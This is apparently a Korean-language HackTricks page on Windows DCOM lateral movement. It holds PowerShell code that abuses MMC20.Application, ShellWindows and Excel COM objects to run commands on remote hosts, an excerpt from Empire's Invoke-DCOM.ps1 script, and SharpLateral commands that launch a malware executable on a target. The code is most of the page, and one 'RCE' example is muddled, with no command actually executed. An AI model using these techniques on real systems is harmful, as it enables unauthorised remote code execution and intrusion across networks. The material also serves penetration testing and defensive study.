# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## MMC20.Application

**이 기술에 대한 자세한 정보는 [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)의 원본 게시물을 확인하세요.**

분산 구성 요소 개체 모델(DCOM) 개체는 개체와의 네트워크 기반 상호 작용을 위한 흥미로운 기능을 제공합니다. Microsoft는 DCOM 및 구성 요소 개체 모델(COM)에 대한 포괄적인 문서를 제공하며, DCOM에 대한 문서는 [여기](https://msdn.microsoft.com/en-us/library/cc226801.aspx)에서, COM에 대한 문서는 [여기](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>)에서 확인할 수 있습니다. DCOM 응용 프로그램 목록은 PowerShell 명령을 사용하여 검색할 수 있습니다:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM 객체인 [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)는 MMC 스냅인 작업의 스크립팅을 가능하게 합니다. 특히, 이 객체는 `Document.ActiveView` 아래에 `ExecuteShellCommand` 메서드를 포함하고 있습니다. 이 메서드에 대한 더 많은 정보는 [여기](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>)에서 확인할 수 있습니다. 실행해 보세요:

이 기능은 DCOM 애플리케이션을 통해 네트워크에서 명령을 실행하는 것을 용이하게 합니다. 관리자로서 DCOM과 원격으로 상호작용하기 위해 PowerShell을 다음과 같이 사용할 수 있습니다:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
이 명령은 DCOM 애플리케이션에 연결하고 COM 객체의 인스턴스를 반환합니다. 그런 다음 ExecuteShellCommand 메서드를 호출하여 원격 호스트에서 프로세스를 실행할 수 있습니다. 이 프로세스는 다음 단계를 포함합니다:

Check methods:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE 얻기:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**이 기술에 대한 자세한 정보는 원본 게시물을 확인하세요 [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

**MMC20.Application** 객체는 명시적인 "LaunchPermissions"가 부족하여 기본적으로 관리자가 접근할 수 있는 권한으로 설정되어 있습니다. 추가 세부정보는 [여기](https://twitter.com/tiraniddo/status/817532039771525120)에서 확인할 수 있으며, 명시적인 Launch Permission이 없는 객체를 필터링하기 위해 [@tiraniddo](https://twitter.com/tiraniddo)의 OleView .NET 사용이 권장됩니다.

명시적인 Launch Permissions가 부족한 두 개의 특정 객체인 `ShellBrowserWindow`와 `ShellWindows`가 강조되었습니다. `HKCR:\AppID\{guid}` 아래에 `LaunchPermission` 레지스트리 항목이 없다는 것은 명시적인 권한이 없음을 의미합니다.

### ShellWindows

ProgID가 없는 `ShellWindows`의 경우, .NET 메서드 `Type.GetTypeFromCLSID`와 `Activator.CreateInstance`를 사용하여 AppID를 통해 객체 인스턴스를 생성할 수 있습니다. 이 과정은 OleView .NET을 활용하여 `ShellWindows`의 CLSID를 검색합니다. 인스턴스화된 후에는 `WindowsShell.Item` 메서드를 통해 상호작용이 가능하며, `Document.Application.ShellExecute`와 같은 메서드 호출로 이어집니다.

객체를 인스턴스화하고 원격으로 명령을 실행하기 위한 PowerShell 명령의 예가 제공되었습니다:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Lateral Movement with Excel DCOM Objects

측면 이동은 DCOM Excel 객체를 이용하여 수행할 수 있습니다. 자세한 정보는 [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)에서 DCOM을 통한 측면 이동을 위한 Excel DDE 활용에 대한 논의를 읽는 것이 좋습니다.

Empire 프로젝트는 DCOM 객체를 조작하여 원격 코드 실행(RCE)을 위해 Excel을 활용하는 PowerShell 스크립트를 제공합니다. 아래는 [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)에서 제공되는 스크립트의 일부로, RCE를 위해 Excel을 악용하는 다양한 방법을 보여줍니다:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Lateral Movement을 위한 자동화 도구

이 기술을 자동화하기 위해 두 가지 도구가 강조됩니다:

- **Invoke-DCOM.ps1**: 원격 머신에서 코드를 실행하기 위한 다양한 방법의 호출을 간소화하는 Empire 프로젝트에서 제공하는 PowerShell 스크립트입니다. 이 스크립트는 Empire GitHub 리포지토리에서 접근할 수 있습니다.

- **SharpLateral**: 원격으로 코드를 실행하기 위해 설계된 도구로, 다음 명령어와 함께 사용할 수 있습니다:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## 자동 도구

- Powershell 스크립트 [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)는 다른 머신에서 코드를 실행하는 모든 주석 처리된 방법을 쉽게 호출할 수 있게 해줍니다.
- [**SharpLateral**](https://github.com/mertdas/SharpLateral)도 사용할 수 있습니다:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## 참고문헌

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

{{#include ../../banners/hacktricks-training.md}}
